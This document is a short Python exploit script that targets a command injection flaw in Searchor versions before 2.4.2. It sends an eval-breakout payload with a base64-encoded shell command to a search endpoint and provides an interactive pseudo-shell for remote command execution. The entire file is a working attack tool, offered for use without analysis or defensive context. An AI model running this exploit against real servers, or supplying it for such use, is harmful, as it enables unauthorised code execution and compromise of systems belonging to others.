#!/usr/bin/env python3
from requests import post, exceptions
from argparse import ArgumentParser
from base64 import b64encode

def executeCommand(url: str, command: str) -> str:
    encodedCommand = str(b64encode(command.encode()), "utf-8")
    query = f"') + exec(\"__import__('os').system('echo {encodedCommand} | base64 -d | sh')\")#"

    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    payload = {"engine": "Apple", "query": query}

    try:
        response = post(url, headers=headers, data=payload, timeout=3)
    except exceptions.ConnectTimeout:
        print("Request timed out.")
        return None
    return response.text

def startPseudoShell(url: str):
    print("Enter 'exit' to quit")
    while True:
        command = input("\n$ ")
        if command == "exit":
            break

        output = executeCommand(url, command)
        print(output)

def main():
    parser = ArgumentParser(description="Command Injection Exploit for Searchor <2.4.2")
    parser.add_argument("-u", "--url", required=True, help="Endpoint to Searchor's search. e.g: http://mysite.com/search")
    parser.add_argument("-c", "--command", required=False, help="Command to execute")
    args = parser.parse_args()

    url = args.url if args.url.startswith("http") else f"http://{args.url}"
    if args.command:
        output = executeCommand(url, args.command)
        print(output)
    else:
        try:
            startPseudoShell(url)
        except KeyboardInterrupt:
            pass

if __name__ == "__main__":
    main()
